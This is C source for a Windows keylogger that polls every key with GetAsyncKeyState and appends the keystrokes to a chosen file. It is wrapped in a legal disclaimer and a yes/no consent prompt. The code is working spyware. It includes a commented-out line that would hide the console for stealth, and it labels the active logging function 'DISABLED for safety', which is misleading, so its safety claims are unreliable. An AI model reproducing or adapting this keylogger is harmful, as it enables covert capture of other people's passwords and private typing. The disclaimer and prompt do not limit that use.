#include <stdio.h>
#include <windows.h>

// ⚠️ LEGAL DISCLAIMER:
// This code is for educational and forensic analysis purposes ONLY!
// Unauthorized use, distribution, or deployment without consent is ILLEGAL.
// The author is NOT responsible for any misuse or damage caused by this code.

int consentGiven = 0;  // Flag to check user consent

// Function to display a consent prompt
void getUserConsent() {
    int choice;
    printf("This program will log keystrokes for forensic analysis ONLY.\n");
    printf("Do you have proper authorization and consent to proceed? (1 = Yes, 0 = No): ");
    scanf("%d", &choice);

    if (choice != 1) {
        printf("Consent not given. Exiting program.\n");
        exit(0);
    }
    consentGiven = 1;  // Consent is given
}

// Function to log keystrokes to a file (DISABLED for safety)
void logKey(int key, FILE *file) {
    if (key == VK_RETURN)
        fprintf(file, "[ENTER]");
    else if (key == VK_BACK)
        fprintf(file, "[BACKSPACE]");
    else if (key == VK_TAB)
        fprintf(file, "[TAB]");
    else if (key == VK_ESCAPE)
        fprintf(file, "[ESCAPE]");
    else if (key == VK_SPACE)
        fprintf(file, " ");
    else if (key >= 32 && key <= 126)  // Printable characters
        fprintf(file, "%c", key);
    else
        fprintf(file, "[%d]", key);  // Log non-printable keys
}

// Main function to capture keystrokes
int main() {
    // Get user consent first
    getUserConsent();

    if (consentGiven) {
        char filePath[260];
        printf("Enter the file path to save the keystrokes (e.g., C:\\Users\\YourName\\Desktop\\keylog.txt): ");
        scanf("%s", filePath);

        FILE *file = fopen(filePath, "a+");
        if (!file) {
            printf("Failed to open file for writing. Exiting program.\n");
            return 1;
        }

        printf("Keylogging started. Press Ctrl + C to stop.\n");

        // ShowWindow(GetConsoleWindow(), SW_HIDE);  // Hides the console window for stealth (DISABLED for safety)

        while (1) {
            for (int key = 8; key <= 255; key++) {
                if (GetAsyncKeyState(key) & 0x8000) {
                    logKey(key, file);  // Log the pressed key
                    fflush(file);        // Ensure immediate write to file
                    Sleep(10);           // Slight delay to avoid excessive file I/O
                }
            }
        }

        fclose(file);
    }

    return 0;
}
